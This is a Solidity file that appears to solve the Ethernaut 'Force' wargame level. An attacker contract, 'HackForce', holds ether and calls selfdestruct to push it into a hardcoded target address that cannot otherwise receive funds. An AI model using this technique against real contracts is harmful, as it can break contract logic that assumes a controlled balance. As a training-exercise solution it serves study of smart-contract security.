pragma solidity ^0.4.18;

contract Force {
/*
                    MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract HackForce {
    
address toHackAddress = 0xeefef766e057361a528cbafa8dfae3f2eb4613d3;
    
    function() payable public {
        
    }
    
    function HackForce() payable {
        
    }
    
    function kill(){
        selfdestruct(toHackAddress);
    }
}